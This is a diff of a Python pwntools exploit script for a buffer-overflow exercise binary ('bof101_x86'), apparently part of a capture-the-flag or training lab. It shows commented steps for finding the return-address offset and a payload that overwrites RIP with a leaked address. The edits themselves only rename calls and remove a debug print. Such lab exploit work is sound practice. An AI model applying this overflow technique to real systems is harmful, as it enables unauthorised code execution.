@@ -7,11 +7,12 @@ HOST = vpn_conf.HOST
 PORT = int(vpn_conf.BASE_PORT + 2)
 EXE_FILENAME = "./bof101_x86"
 OFFSET_RIP = 44
+
 # HOW TO FIND FIND THE OFFSET
-# pattern = cyclic(100)
-# io = process(bin)
+# pattern = pwn.cyclic(100)
+# io = pwn.process(bin)
 # io.sendline(pattern)
-# offset = cyclic_find(0x6161616c)
+# offset = pwn.cyclic_find(0x6161616C)
 
 
 def start():
@@ -25,7 +26,6 @@ if __name__ == "__main__":
     io = start()
     leaked_address = io.recvuntil(b"&x=")
     leaked_address = io.recvline().strip().decode()
-    print(f"LEAKED_ADDRESS ---------{leaked_address}---------")
     io.sendline(
         b"a" * OFFSET_RIP
         + pwn.p64(int(leaked_address, 16))
